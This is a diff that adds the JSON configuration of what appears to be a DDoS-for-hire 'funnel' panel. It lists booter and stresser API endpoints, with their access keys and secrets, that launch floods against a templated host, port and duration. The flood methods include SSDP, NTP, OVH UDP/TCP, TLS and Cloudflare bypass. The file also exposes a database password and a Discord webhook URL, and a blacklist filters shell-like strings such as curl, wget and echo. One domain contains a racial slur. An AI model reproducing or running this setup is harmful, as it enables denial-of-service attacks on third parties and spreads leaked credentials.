@@ -1,0 +1,294 @@
+{
+    "webserver": {
+        "host": "144.217.42.160",
+        "debug": true,
+        "enabled": true
+    },
+    "database": {
+        "host": "localhost:3306",
+        "username": "funneler",
+        "password": "Funneluwu123$",
+        "table": "funnel"
+    },
+    "webhooks": {
+        "telegram": {
+            "token": "PUT A TELEGRAM BOT TOKEN HERE IF YOU'D LIKE",
+            "chatid": "PUT A TELEGRAM CHANNEL ID HERE IF YOU'D LIKE",
+            "enabled": false
+        },
+        "discord": {
+            "webhook": "https://discord.com/api/webhooks/1019164621258620939/loXRfNbBHlJCHrDB3toggcYdEhAkxyLj8KPnE2u6QFusDpgqJDBAxUnFPDjwkAX6jX88",
+            "image": "https://media.discordapp.net/attachments/1017392747709202595/1017790436439502848/Purple_Aquamarine_Art_Pixel_Art_Discord_Profile_Banner.png",
+            "enabled": true
+        }
+    },
+    "attack_settings": {
+        "blacklists": [
+            ".gov",
+            ".edu",
+            "curl",
+            ".ru",
+            "russia",
+            "wget",
+            "1.1.1.1",
+            ">",
+            "<",
+            "echo",
+            "insert",
+            "mysql",
+            "localhost"
+        ],
+        "attacks": {
+            "enabled": true,
+            "slots": {
+                "max": 10,
+                "enabled": true
+            },
+            "powersaving": {
+                "enabled": true
+            },
+            "spamcheck": {
+                "general": {
+                    "amount": 3,
+                    "per_seconds": 300,
+                    "enabled": false
+                },
+                "target": {
+                    "amount": 3,
+                    "per_seconds": 300,
+                    "enabled": false
+                }
+            }
+        }
+    },
+    "attacks": [
+        {
+            "name": "HOME",
+            "links": [
+                "https://cloudflare.com/api/attack?username=&secret=&host={HOST}&port={PORT}&time={TIME}&method=SSDP",
+                "https://google.com/api/attack?username=&secret=&host={HOST}&port={PORT}&time={TIME}&method=HOME-NTP"
+            ],
+            "config": {
+                "slots": {
+                    "max": 2,
+                    "enabled": false
+                },
+                "maxtime": {
+                    "hard": {
+                        "time": 60,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "time": 30,
+                        "enabled": false
+                    }
+                },
+                "status": {
+                    "enabled": true,
+                    "vip": false,
+                    "private": {
+                        "enabled": false,
+                        "users": [
+                            "root",
+                            "mypartner"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "name": "https",
+            "links": [
+                "https://frost-x.world/NetworkL7?key=3zvkx2pnf08qvy7&username=Terminaluwu&host={HOST}&port={PORT}&time={TIME}&method=HTTPS-BLIZZARD",
+                "https://api.cyberstress.us?token=fitgtRnmsq7Tm2JoN1HBVk&host={HOSTS}&port={PORT}&time={TIME}&concs=2&reqs=64&method=HTTPSOCKET",
+                "https://liquidproxy.cf/api/attack?username=TerminalVIP&secret=vip18271&host={HOST}&port={PORT}&time={TIME}&method=TLS",
+                "https://api.spacestress.cc/?key=GwUFW4qiNlJb&type=L7&target={HOST}&port={PORT}&time={TIME}&method=TLSV2",
+                "https://api.future-api.com/funnel/attack?key=FUTURE-TERMINAL&host={HOST}&port={PORT}&time={TIME}&method=FUTURE-HTTPS",
+                "http://nigga.sbs/api/attack?username=Terminal&secret=Term&host={HOST}&port={PORT}&time={TIME}&method=HTTPS"      
+        
+                
+            ],
+            "config": {
+                "slots": {
+                    "max": 5,
+                    "enabled": true
+                },
+                "maxtime": {
+                    "hard": {
+                        "time": 60,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "time": 30,
+                        "enabled": false
+                    }
+                },
+                "status": {
+                    "enabled": true,
+                    "vip": false,
+                    "private": {
+                        "enabled": false,
+                        "users": [
+                            "kingcobra",
+                            "johnthegoat"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "name": "bypass",
+            "links": [
+                "https://frost-x.world/NetworkL7?key=3zvkx2pnf08qvy7&username=Terminaluwu&host={HOST}&port={PORT}&time={TIME}&method=CF-ICEV2",
+                "https://api.cyberstress.us?token=fitgtRnmsq7Tm2JoN1HBVk&host={HOSTS}&port={PORT}&time={TIME}&concs=2&reqs=64&method=BYPASS",
+                "http://142.132.197.159:1337/attack.c?user=inverse&key=inversec2&host={HOST}&port={PORT}&time={TIME}&method=bypass",
+                "https://liquidproxy.cf/api/attack?username=TerminalVIP&secret=vip18271&host={HOST}&port={PORT}&time={TIME}&method=TLS",
+                "https://api.spacestress.cc/?key=GwUFW4qiNlJb&type=L7&target={HOST}&port={PORT}&time={TIME}&method=TLSV2",
+                "https://api.future-api.com/funnel/attack?key=FUTURE-TERMINAL&host={HOST}&port={PORT}&time={TIME}&method=FUTURE-HTTPS",
+                "http://nigga.sbs/api/attack?username=Terminal&secret=Term&host={HOST}&port={PORT}&time={TIME}&method=BYPASSED"
+            ],
+            "config": {
+                "slots": {
+                    "max": 5,
+                    "enabled": true
+                },
+                "maxtime": {
+                    "hard": {
+                        "time": 60,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "time": 30,
+                        "enabled": false
+                    }
+                },
+                "status": {
+                    "enabled": true,
+                    "vip": false,
+                    "private": {
+                        "enabled": false,
+                        "users": [
+                            "kingcobra",
+                            "johnthegoat"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "name": "browser",
+            "links": [
+                "https://frost-x.world/NetworkL7?key=3zvkx2pnf08qvy7&username=Terminaluwu&host={HOST}&port={PORT}&time={TIME}&method=BROWSER-CLD",
+                "https://api.cyberstress.us?token=fitgtRnmsq7Tm2JoN1HBVk&host={HOSTS}&port={PORT}&time={TIME}&concs=2&reqs=64&method=BROWSER",
+                "http://142.132.197.159:1337/attack.c?user=inverse&key=inversec2&host={HOST}&port={PORT}&time={TIME}&method=browser",
+                "https://liquidproxy.cf/api/attack?username=TerminalVIP&secret=vip18271&host={HOST}&port={PORT}&time={TIME}&method=TLS",
+                "https://api.spacestress.cc/?key=GwUFW4qiNlJb&type=L7&target={HOST}&port={PORT}&time={TIME}&method=TLS-STORM-V2",
+                "https://api.future-api.com/funnel/attack?key=FUTURE-TERMINAL&host={HOST}&port={PORT}&time={TIME}&method=FUTURE-BROWSER",
+                "http://nigga.sbs/api/attack?username=Terminal&secret=Term&host={HOST}&port={PORT}&time={TIME}&method=CLOUDFARE"
+            ],
+            "config": {
+                "slots": {
+                    "max": 5,
+                    "enabled": true
+                },
+                "maxtime": {
+                    "hard": {
+                        "time": 60,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "time": 30,
+                        "enabled": false
+                    }
+                },
+                "status": {
+                    "enabled": true,
+                    "vip": false,
+                    "private": {
+                        "enabled": false,
+                        "users": [
+                            "kingcobra",
+                            "johnthegoat"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "name": "tcp",
+            "links": [
+                "https://api.cyberstress.us?token=fitgtRnmsq7Tm2JoN1HBVk&host={HOSTS}&port={PORT}&time={TIME}&concs=2&reqs=64&method=OVHTCP",
+                "http://185.217.0.127:1337/attack.c?user=inverse&key=inversec2&host={HOST}&port={PORT}&time={TIME}&method=tcp",
+                "https://liquidproxy.cf/api/attack?username=TerminalVIP&secret=vip18271&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.spacestress.cc/?key=GwUFW4qiNlJb&type=L7&target={HOST}&port={PORT}&time={TIME}&method=OVH-TCP",
+                "https://api.future-api.com/funnel/attack?key=FUTURE-TERMINAL&host={HOST}&port={PORT}&time={TIME}&method=FUTURE-TCP",
+                "http://nigga.sbs/api/attack?username=Terminal&secret=Term&host={HOST}&port={PORT}&time={TIME}&method=OVH-TCP"
+            ],
+            "config": {
+                "slots": {
+                    "max": 5,
+                    "enabled": true
+                },
+                "maxtime": {
+                    "hard": {
+                        "time": 60,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "time": 30,
+                        "enabled": false
+                    }
+                },
+                "status": {
+                    "enabled": true,
+                    "vip": false,
+                    "private": {
+                        "enabled": false,
+                        "users": [
+                            "kingcobra",
+                            "johnthegoat"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "name": "udp",
+            "links": [
+                "https://api.cyberstress.us?token=fitgtRnmsq7Tm2JoN1HBVk&host={HOSTS}&port={PORT}&time={TIME}&concs=2&reqs=64&method=UDPPLAIN",
+                "http://185.217.0.127:1337/attack.c?user=inverse&key=inversec2&host={HOST}&port={PORT}&time={TIME}&method=ovh-udp",
+                "https://liquidproxy.cf/api/attack?username=TerminalVIP&secret=vip18271&host={HOST}&port={PORT}&time={TIME}&method=OVH-UDP",
+                "https://api.spacestress.cc/?key=GwUFW4qiNlJb&type=L7&target={HOST}&port={PORT}&time={TIME}&method=OVH-UDP",
+                "https://api.future-api.com/funnel/attack?key=FUTURE-TERMINAL&host={HOST}&port={PORT}&time={TIME}&method=FUTURE-UDP",
+                "http://nigga.sbs/api/attack?username=Terminal&secret=Term&host={HOST}&port={PORT}&time={TIME}&method=OVH-UDP"
+            ],
+            "config": {
+                "slots": {
+                    "max": 5,
+                    "enabled": true
+                },
+                "maxtime": {
+                    "hard": {
+                        "time": 60,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "time": 30,
+                        "enabled": false
+                    }
+                },
+                "status": {
+                    "enabled": true,
+                    "vip": false,
+                    "private": {
+                        "enabled": false,
+                        "users": [
+                            "kingcobra",
+                            "johnthegoat"
+                        ]
+                    }
+                }
+            }
+        }
+    ]
+}
